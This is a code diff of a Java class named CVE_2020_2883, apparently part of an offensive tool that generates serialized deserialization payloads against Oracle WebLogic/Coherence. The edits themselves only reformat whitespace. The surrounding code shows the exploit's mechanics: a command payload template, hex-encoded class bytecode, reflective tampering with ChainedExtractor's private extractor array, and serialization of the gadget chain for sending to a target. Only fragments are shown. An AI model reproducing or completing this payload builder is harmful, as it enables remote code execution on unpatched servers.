@@ -9,6 +9,7 @@ import com.tangosol.util.comparator.ExtractorComparator;
 import com.tangosol.util.extractor.ChainedExtractor;
 import com.tangosol.util.extractor.ReflectionExtractor;
 import org.apache.tomcat.util.buf.HexUtils;
+
 import javax.script.ScriptEngineManager;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
@@ -20,7 +21,7 @@ public class CVE_2020_2883 {
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
 
         String className;
-        switch (type){
+        switch (type) {
             case command:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                 commandTemplate.cache();
@@ -74,9 +75,9 @@ public class CVE_2020_2883 {
         }
 
         byte[] bytes = Cache.get(className);
-        if(bytes == null){
+        if (bytes == null) {
             String shortName = className.substring(className.lastIndexOf(".") + 1);
-            bytes =  Cache.get(shortName);
+            bytes = Cache.get(shortName);
         }
         String classCode = HexUtils.toHexString(bytes);
 
@@ -128,7 +129,7 @@ public class CVE_2020_2883 {
                 extractor4
         };
 
-        Class clazz = ChainedExtractor.class.getSuperclass();
+        Class clazz        = ChainedExtractor.class.getSuperclass();
         Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
         m_aExtractor.setAccessible(true);
 
@@ -150,7 +151,7 @@ public class CVE_2020_2883 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(queue);
         bytes = baous.toByteArray();
         oos.close();
